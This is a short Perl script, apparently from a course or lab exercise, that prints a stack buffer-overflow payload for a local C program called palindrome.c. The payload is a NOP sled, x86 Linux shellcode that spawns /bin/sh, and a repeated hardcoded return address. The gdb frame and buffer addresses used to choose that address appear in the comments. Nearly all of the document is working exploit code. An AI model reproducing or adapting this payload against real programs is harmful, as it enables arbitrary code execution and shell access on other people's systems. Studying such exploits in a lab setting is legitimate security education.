#!/usr/bin/perl

my $noops= "\x90" x 16; #16 noops

my $shellCodeBase=
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
  "\x80\xe8\xdc\xff\xff\xff/bin/sh" .
  "\x90\x90\x90"; # extended to 3*16 bytes

# this is the return address for the shell code?
my $returnAddress = "\x10\xf9\xff\xbf";

# Breakpoint 1, processOneLine () at palindrome.c:10
# 10              int isPalindrome=1; // it is a palindrome until we find out otherwise
# (gdb) info frame
# Stack level 0, frame at 0xbffffcc8:
#  eip = 0x8048529 in processOneLine (palindrome.c:10); saved eip 0x8048685
#  called by frame at 0xbffffcd8
#  source language c.
#  Arglist at 0xbffffcc8, args:
#  Locals at 0xbffffcc8, Previous frame's sp is 0x0
#  Saved registers:
#   ebp at 0xbffffcc8, eip at 0xbffffccc
# (gdb) print &s
# $1 = (char (*)[1024]) 0xbffff8c0
# (gdb) 

my $shellCode= ($noops x 57) . ($shellCodeBase) . ($noops x 4) . ($returnAddress x 4);

print "$shellCode";
